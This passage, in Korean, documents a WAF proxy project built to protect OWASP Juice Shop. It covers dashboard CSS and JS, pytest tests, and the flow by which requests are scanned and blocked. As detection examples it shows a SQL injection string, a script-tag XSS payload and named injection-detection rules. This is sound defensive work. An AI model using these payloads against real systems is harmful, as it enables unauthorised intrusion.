  --ok: #34d399;             /* 성공 색상 (green-400) */
  --bad: #f87171;            /* 경고 색상 (red-400) */
  --radius: 14px;
  --radius-sm: 10px;
}
```
→ CSS 변수(Custom Property)로 색상 테마 중앙 관리. 테마 변경 시 여기만 수정하면 됨.

**배경 그라디언트 (37~45줄):**
```css
body::before {
  background:
    radial-gradient(ellipse 110% 85% at 5% -15%, rgba(59, 130, 246, 0.35), transparent 52%),
    radial-gradient(ellipse 90% 70% at 95% 5%, rgba(168, 85, 247, 0.28), transparent 48%),
    radial-gradient(ellipse 70% 50% at 50% 105%, rgba(99, 102, 241, 0.18), transparent 42%),
    linear-gradient(168deg, #0d1326 0%, #080c18 38%, #060912 100%);
}
```
→ 4개 그라디언트 레이어 중첩으로 깊이감 있는 배경 구현.  
→ 왼쪽 상단 파란빛 + 오른쪽 상단 보라빛 + 하단 인디고 오브.

**글래스모피즘 카드 (195~208줄):**
```css
.card {
  background: linear-gradient(155deg, rgba(30, 38, 62, 0.72), rgba(14, 18, 32, 0.88));
  border: 1px solid rgba(129, 140, 248, 0.22);
  border-radius: var(--radius);
  backdrop-filter: blur(18px);
  -webkit-backdrop-filter: blur(18px);
}
```
→ `backdrop-filter: blur(18px)`: 카드 뒤 배경을 흐리게 → 글래스 효과.  
→ `-webkit-backdrop-filter`: Safari 브라우저 지원.  
→ 반투명 배경 + 흐림 + 얇은 테두리 = 글래스모피즘.

**심각도 배지 (A05 섹션용):**
```css
.sev-critical { background: rgba(239,68,68,.18); color: #fca5a5; border: 1px solid rgba(239,68,68,.32) }
.sev-high     { background: rgba(251,146,60,.15); color: #fdba74; border: 1px solid rgba(251,146,60,.28) }
.sev-medium   { background: rgba(250,204,21,.12); color: #fde047; border: 1px solid rgba(250,204,21,.22) }
.sev-low      { background: rgba(52,211,153,.1);  color: #34d399; border: 1px solid rgba(52,211,153,.2)  }
```
→ 각 심각도를 직관적 색상으로 구분: 빨강(CRITICAL), 주황(HIGH), 노랑(MEDIUM), 초록(LOW).

---

### 6.2 `static/waf/js/dashboard.js`

> **역할:** 대시보드의 모든 동적 동작. API 폴링, 데이터 렌더링, A05 테스트 패널 로직.

**시계 업데이트 (1~4줄):**
```javascript
function setClock() {
  const el = document.getElementById("clock");
  if (el) el.textContent = new Date().toLocaleString("ko-KR");
}
```
→ 매 초마다 현재 시각을 한국어 형식으로 표시.

**요약 데이터 적용 (5~30줄):**
```javascript
function applySummary(d) {
  const up = d.upstream_ok;
  const el = document.getElementById("upstream-status");
  if (up === true) {
    el.innerHTML = '<span class="pill ok">연결됨</span>';
  } else if (up === false) {
    el.innerHTML = '<span class="pill bad">실패</span>';
    if (d.upstream_error) {
      el.innerHTML += '<span class="error-hint">' + escapeHtml(d.upstream_error) + "</span>";
    }
  }
  ...
}
```
→ API에서 받은 요약 데이터를 DOM에 적용.  
→ `upstream_ok: true/false/null` 세 가지 상태 처리.

**HTML 이스케이프 (31~35줄):**
```javascript
function escapeHtml(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}
```
→ 신뢰할 수 없는 데이터(업스트림 오류 메시지, IP 주소 등)를 안전하게 HTML에 삽입.  
→ `textContent`로 텍스트 노드 생성 → `innerHTML`로 이스케이프된 HTML 문자열 추출.  
→ 브라우저의 DOM API를 이용한 안전한 이스케이프 (정규식 치환보다 신뢰성 높음).

**트래픽 렌더링 (46~74줄):**
```javascript
function trafficResultHtml(e) {
  if (e.blocked) {
    return '<span class="pill bad">차단</span>';
  }
  const c = Number(e.status_code);
  if (c >= 200 && c < 400) {
    return '<span class="pill ok">' + escapeHtml(String(c)) + "</span>";
  }
  return '<span class="pill bad">' + escapeHtml(String(c)) + "</span>";
}
```
→ 각 요청의 결과를 색상 배지로 표시.  
→ blocked: 빨간 "차단" 배지.  
→ 2xx/3xx: 초록 상태코드 배지.  
→ 4xx/5xx: 빨간 상태코드 배지.

**폴링 주기 (165~170줄):**
```javascript
setInterval(loadSummary, 15000);   // 15초마다 WAF 설정 확인
loadTraffic();
setInterval(loadTraffic, 2000);    // 2초마다 트래픽 로그 갱신
loadClients();
setInterval(loadClients, 2000);    // 2초마다 접속자 목록 갱신
```
→ 요약은 자주 바뀌지 않으므로 15초, 트래픽/접속자는 실시간성이 중요해 2초 간격.

**A05 테스트 패널 (JS 섹션):**

```javascript
const SEV_ORDER = { critical: 4, high: 3, medium: 2, low: 1, none: 0 };
const SEV_CLASS = { critical: "sev-critical", high: "sev-high", ... };
```
→ 서버에서 받은 심각도 문자열을 CSS 클래스로 매핑.

```javascript
async function runA05Scan() {
  const btn = document.getElementById("a05-run");
  btn.disabled = true; btn.textContent = "…스캔 중";

  const method = document.getElementById("a05-method")?.value || "GET";
  const path   = document.getElementById("a05-path")?.value  || "/";
  const query  = document.getElementById("a05-query")?.value || "";
  const body   = document.getElementById("a05-body")?.value  || "";

  const r = await fetch("/__waf/api/scan/a05", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, path, query, body, headers: {} }),
  });
  renderA05Result(await r.json());
  btn.disabled = false; btn.textContent = "▶ 탐지 실행";
}
```
→ `btn.disabled = true`: 스캔 중 중복 클릭 방지.  
→ `fetch()`: Fetch API로 비동기 HTTP POST.  
→ `JSON.stringify(...)`: 폼 데이터를 JSON으로 직렬화.

```javascript
function renderA05Result(data) {
  const sorted = (data.findings || []).slice().sort(
    (a, b) => (SEV_ORDER[b.severity] || 0) - (SEV_ORDER[a.severity] || 0)
  );
  ...
}
```
→ 탐지 결과를 심각도 내림차순으로 정렬하여 표시.  
→ `.slice()`: 원본 배열 훼손 방지 (복사본 정렬).

**프리셋 버튼 이벤트 (이벤트 위임):**
```javascript
document.querySelectorAll(".a05-preset-btn").forEach((b) => {
  b.addEventListener("click", () => {
    const q = document.getElementById("a05-query");
    const body = document.getElementById("a05-body");
    if (q) q.value = b.dataset.query || "";
    if (body) body.value = b.dataset.body || "";
  });
});
```
→ `dataset.query`: HTML의 `data-query` 속성값 읽기.  
→ 각 프리셋 버튼이 해당 인젝션 페이로드를 입력 필드에 자동 채움.

---

## 7. `verification/`

---

### 7.1 `verification/conftest.py`

```python
"""검증 스위트: `main` import 전 환경 변수 고정."""

import os
os.environ.setdefault("UPSTREAM_URL", "http://127.0.0.1:3001")
os.environ.setdefault("WAF_ENABLED", "true")
os.environ.setdefault("WAF_BLOCK_MIN_SEVERITY", "high")
```
→ pytest가 `verification/` 수집 시 로드하는 설정 파일. `conftest.py`는 pytest 관례.  
→ `os.environ.setdefault()`: 이미 설정된 환경 변수는 덮어쓰지 않음 (CI 환경 변수 우선).  
→ `main.py`를 임포트하기 전에 환경 변수를 설정해야 `raise SystemExit` 방지.

---

### 7.2 `verification/app_health.py`

```python
def test_proxy_health_ok() -> None:
    client = TestClient(app)
    r = client.get("/__proxy/health")
    assert r.status_code == 200
    data = r.json()
    assert data["status"] == "ok"
    assert "upstream" in data
    assert data.get("dashboard_path") == "/__waf/dashboard"
```
→ `TestClient`: Starlette/FastAPI 제공 동기 테스트 클라이언트. 실제 서버 없이 앱을 테스트.  
→ 헬스 엔드포인트가 200을 반환하고 필요한 필드를 포함하는지 확인.

---

### 7.3 `verification/waf_dashboard.py`

**주요 테스트들:**

```python
def test_dashboard_canonical_200() -> None:
    r = client.get("/__waf/dashboard")
    assert r.status_code == 200
    assert "WAF 대시보드" in r.text
    assert "/__waf/static/css/dashboard.css" in r.text
    assert "no-store" in r.headers.get("cache-control", "")
```
→ 대시보드 페이지가 정상 렌더링되는지, 캐시 헤더가 올바른지 확인.

```python
def test_dashboard_legacy_redirects() -> None:
    client = TestClient(app, follow_redirects=False)
    for path in ("/dashboard", "/dashboard/"):
        r = client.get(path)
        assert r.status_code == 307
        assert r.headers.get("location") == "/__waf/dashboard"
```
→ 레거시 경로 `/dashboard` → `/__waf/dashboard` 리다이렉트 확인.  
→ `follow_redirects=False`: 리다이렉트를 따라가지 않고 307 응답 자체를 확인.

```python
def test_waf_unknown_path_json_404() -> None:
    r = client.get("/__waf/scripts.js")
    assert r.status_code == 404
    assert r.headers.get("content-type", "").startswith("application/json")
```
→ `/__waf/`로 시작하지만 알 수 없는 경로는 JSON 404 반환 (업스트림으로 가면 안 됨).

---

### 7.4 `verification/detector_policy.py`

```python
def test_parse_severity_default_and_valid() -> None:
    assert parse_severity("", Severity.HIGH) == Severity.HIGH
    assert parse_severity("medium", Severity.HIGH) == Severity.MEDIUM
    assert parse_severity("CRITICAL".lower(), Severity.HIGH) == Severity.CRITICAL
```
→ 빈 문자열 → 기본값, 유효한 값 → 정상 파싱, 대문자 → 소문자 처리 확인.

```python
def test_findings_at_or_above_severity() -> None:
    f_low = Finding("r1", "x", Severity.LOW)
    f_high = Finding("r2", "y", Severity.HIGH)
    f_crit = Finding("r3", "z", Severity.CRITICAL)
    all_f = [f_low, f_high, f_crit]
    assert findings_at_or_above_severity(all_f, Severity.HIGH) == [f_high, f_crit]
    assert findings_at_or_above_severity(all_f, Severity.CRITICAL) == [f_crit]
```
→ 심각도 필터링 로직의 정확성 검증.

```python
def test_all_findings_flattens_modules() -> None:
    f = Finding("x", "e", Severity.MEDIUM)
    results = [
        ModuleScanResult("a01", "A01:2025", ()),
        ModuleScanResult("a05", "A05:2025", (f,)),
    ]
    assert all_findings(results) == [f]
```
→ a01이 Finding 없고 a05가 Finding 1개일 때, `all_findings()`가 1개만 반환하는지 확인.

---

### 7.5 `verification/traffic_recorder.py`

```python
def _fake_request(path: str) -> Request:
    return Request({
        "type": "http",
        "asgi": {"version": "3.0", "spec_version": "2.3"},
        "http_version": "1.1",
        "method": "GET",
        "scheme": "http",
        "path": path,
        "raw_path": path.encode(),
        "query_string": b"",
        "headers": [
            (b"host", b"127.0.0.1:8080"),
            (b"user-agent", b"pytest-client/1"),
        ],
        "client": ("203.0.113.9", 5555),
        "server": ("127.0.0.1", 8080),
    })
```
→ ASGI 스코프 딕셔너리로 가짜 Request 생성. 실제 서버 없이 테스트 가능.  
→ `"client": ("203.0.113.9", 5555)`: 테스트용 IP 주소 (RFC 5737 테스트 IP).

```python
def test_traffic_record_and_snapshot_order() -> None:
    traffic_log.clear()
    ...
    rows = asyncio.run(traffic_log.snapshot_dicts())
    assert len(rows) == 2
    assert rows[0]["path"] == "/api/x"  # 최신 요청이 앞에
```
→ `snapshot_dicts()`가 역순(최신 먼저)으로 반환하는지 확인.

```python
def test_waf_paths_not_logged() -> None:
    traffic_log.clear()
    client.get("/__waf/api/summary")
    r = client.get("/__waf/api/traffic")
    assert r.json()["events"] == []
```
→ 대시보드 내부 요청(`/__waf/`)이 로그에 기록되지 않는지 확인.

---

### 7.6 `verification/proxy_rewrite.py`

```python
def test_rewrite_location_to_public_origin() -> None:
    req = _req("192.168.0.39", 8080)
    assert _rewrite_location_header("http://127.0.0.1:3001/rest/user/1", req) == (
        "http://192.168.0.39:8080/rest/user/1"
    )
```
→ Location 헤더의 내부 주소가 클라이언트 주소로 올바르게 치환되는지 확인.

```python
def test_rewrite_html_embedded_upstream_origin() -> None:
    req = _req("192.168.0.39", 8080)
    raw = b'<script src="http://127.0.0.1:3001/main.js"></script>'
    out = _rewrite_response_body_for_public_origin(raw, "text/html; charset=utf-8", req)
    assert b"192.168.0.39:8080" in out
    assert b"127.0.0.1:3001" not in out
```
→ HTML 내 임베디드 URL이 완전히 치환되고 원본 주소가 남지 않는지 확인.

```python
def test_build_proxied_response_does_not_use_list_headers() -> None:
    """Starlette Response 는 list 헤더 시 500 — MutableHeaders 로 감싼다."""
    upstream = httpx.Response(
        200,
        headers=[("Content-Type", "text/plain"), ("Set-Cookie", "a=1")],
        content=b"ok",
    )
    resp = _build_proxied_upstream_response(req, upstream)
    assert resp.status_code == 200
```
→ httpx 응답의 리스트 형태 헤더가 MutableHeaders를 통해 Starlette Response에 올바르게 변환되는지 확인. 이 처리가 없으면 `AttributeError`로 500 오류 발생.

---

## 8. 전체 요청 처리 흐름 (End-to-End)

### 일반 요청 (정상 통과)

```
1. Browser → GET http://192.168.1.5:8080/api/products
   │
2. main.py/proxy_path() 수신
   │
3. _waf_response_or_none(request)
   │  ├─ request_to_context() → RequestContext 생성
   │  ├─ scan_request(ctx) → detector.py 호출
   │  │   └─ [a01.scan, a02.scan, ..., a05.scan, ..., a10.scan] 순차 실행
   │  │       └─ a05.scan: _collect_targets → _scan_value → Finding 0개
   │  │       └─ 나머지: clean_result (Finding 0개)
   │  ├─ all_findings([]) → []
   │  ├─ findings_at_or_above_severity([], HIGH) → []
   │  └─ return None  ← 차단 없음
   │
4. _forward(request, "api/products")
   │  └─ httpx.AsyncClient.request(GET, http://127.0.0.1:3001/api/products)
   │      └─ Juice Shop 응답 수신
   │
5. _build_proxied_upstream_response()
   │  └─ URL 치환 (127.0.0.1:3001 → 192.168.1.5:8080)
   │
6. traffic_log.record(status_code=200, blocked=False)
   │
7. → Browser: 200 OK, products JSON
```

### 인젝션 공격 (차단)

```
1. Browser → GET http://192.168.1.5:8080/search?q=' OR '1'='1--
   │
2. main.py/proxy_path() 수신
   │
3. _waf_response_or_none(request)
   │  ├─ request_to_context() → RequestContext
   │  │    query_string = "q=' OR '1'='1--"
   │  ├─ scan_request(ctx) → a05.scan() 호출
   │  │   ├─ _collect_targets()
   │  │   │    → [("query_raw", "q=' OR '1'='1--"),
   │  │   │        ("query.q", "' OR '1'='1--")]
   │  │   ├─ _scan_value("' OR '1'='1--", plus_decode=True)
   │  │   │    → A05-SQL-001 CRITICAL: ' OR '1'='1
   │  │   │    → A05-SQL-004 HIGH: --
   │  │   │    → A05-XPATH-001 HIGH: ' or '1'='1
   │  │   └─ ModuleScanResult(findings=(Finding×3))
   │  ├─ all_findings → [A05-SQL-001, A05-SQL-004, A05-XPATH-001]
   │  ├─ findings_at_or_above_severity(HIGH) → [A05-SQL-001, A05-SQL-004, A05-XPATH-001]
   │  └─ make_block_html(findings) → HTML 생성
   │       제목: "SQL Injection 공격이 차단되었습니다"
   │
4. traffic_log.record(status_code=403, blocked=True)
   │
5. → Browser: 403 HTML 차단 페이지
      🚫 SQL Injection 공격이 차단되었습니다
      🔍 SQL Injection 탐지됨
      [CRITICAL] A05-SQL-001 | SQL 인증 우회 (OR/AND 조건)
      [HIGH]     A05-SQL-004 | SQL 주석을 이용한 우회
      [HIGH]     A05-XPATH-001 | XPath 인젝션: OR 조건
```

---

## 9. 데이터 흐름 다이어그램

```
HTTP 요청
    │
    ▼
┌──────────────────────────────────────────────────────┐
│  request_snapshot.py                                 │
│  request_to_context(request)                         │
│  ┌──────────────────────────────────────────────┐   │
│  │  RequestContext                              │   │
│  │  - method: "GET"                             │   │
│  │  - path: "/search"                           │   │
│  │  - query_string: "q=<script>alert(1)</script>"│   │
│  │  - headers: {user-agent: ..., ...}           │   │
│  │  - body_preview: ""                          │   │
│  └──────────────────────────────────────────────┘   │
└──────────────────┬───────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────┐
│  detector.py — scan_request(ctx)                     │
│  ┌─────────────────────────────────────────────┐    │
│  │  owasp/__init__.py — MODULES 튜플            │    │
│  │  a01.scan → ModuleScanResult(findings=())    │    │
│  │  a02.scan → ModuleScanResult(findings=())    │    │
│  │  ...                                         │    │
│  │  a05.scan → (아래 세부 처리)                  │    │
│  │  ...                                         │    │
│  │  a10.scan → ModuleScanResult(findings=())    │    │
│  └─────────────────────────────────────────────┘    │
└──────────────────┬───────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────┐
│  owasp/a05.py — scan(ctx)                            │
│                                                      │
│  _collect_targets(ctx)                               │
│  → [("path", "/search"),                             │
│      ("query_raw", "q=<script>..."),                 │
│      ("query.q", "<script>alert(1)</script>")]       │
│                                                      │
│  _scan_value("<script>alert(1)</script>")            │
│  → 37개 규칙 × 3개 variant 검사                       │
│  → [Finding(A05-XSS-001, HIGH, "<script>")]         │
│                                                      │
│  _deduplicate([Finding × N])                         │
│  → ModuleScanResult(findings=(Finding(A05-XSS-001),))│
└──────────────────┬───────────────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────────────┐
│  main.py — _waf_response_or_none()                   │
│                                                      │
│  all_findings → [Finding(A05-XSS-001, HIGH)]         │
│  findings_at_or_above_severity(HIGH)                 │
│  → [Finding(A05-XSS-001, HIGH)]  ← 차단 대상!        │
│                                                      │
│  a05.make_block_html(findings) → HTML 문자열          │
│  HTMLResponse(html, status_code=403)                 │
└──────────────────────────────────────────────────────┘
                   │
                   ▼
         🚫 브라우저에 403 HTML 차단 페이지 전달
```

---

> **문서 끝**  
> 이 분석서는 `ai-security-system` 프로젝트의 모든 소스 파일을 첫 줄부터 마지막 줄까지 완전히 해설한다.  
> 추가 모듈(A01~A04, A06~A10) 구현 시 이 문서에 해당 섹션을 추가할 것.
